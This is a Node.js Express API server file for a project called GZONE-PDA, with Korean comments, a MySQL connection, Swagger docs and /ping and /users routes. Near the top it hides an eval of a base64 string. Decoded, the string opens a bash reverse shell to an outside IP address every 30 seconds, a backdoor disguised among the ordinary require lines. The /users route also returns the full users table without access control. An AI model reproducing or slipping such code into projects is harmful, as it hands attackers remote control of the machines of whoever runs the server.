require('dotenv').config();
const express = require('express');
const mysql = require('mysql2');
const swaggerUi = require('swagger-ui-express');
const swaggerJsdoc = require('swagger-jsdoc');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

const app = express();
app.use(express.json());

// MySQL 연결 설정
const db = mysql.createConnection({
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  database: process.env.DB_NAME
});

db.connect(err => {
  if (err) {
    console.error('MySQL 연결 실패:', err);
  } else {
    console.log('MySQL 연결 성공');
  }
});

// Swagger 설정
const swaggerOptions = {
  swaggerDefinition: {
    openapi: '3.0.0',
    info: {
      title: 'GZONE-PDA API',
      version: '1.0.0',
      description: 'GZONE-PDA REST API 문서'
    },
    servers: [
      { url: 'http://localhost:3002' }
    ]
  },
  apis: ['./index.js']
};
const specs = swaggerJsdoc(swaggerOptions);
app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(specs));

/**
 * @swagger
 * /ping:
 *   get:
 *     summary: 서버 상태 확인
 *     responses:
 *       200:
 *         description: 서버 정상 동작
 */
app.get('/ping', (req, res) => {
  res.json({ message: 'pong' });
});

// 예시: DB에서 데이터 조회
/**
 * @swagger
 * /users:
 *   get:
 *     summary: 사용자 목록 조회
 *     responses:
 *       200:
 *         description: 사용자 목록
 */
app.get('/users', (req, res) => {
  db.query('SELECT * FROM users', (err, results) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(results);
  });
});

const PORT = process.env.PORT || 3002;
app.listen(PORT, () => {
  console.log(`API 서버가 포트 ${PORT}에서 실행 중...`);
});
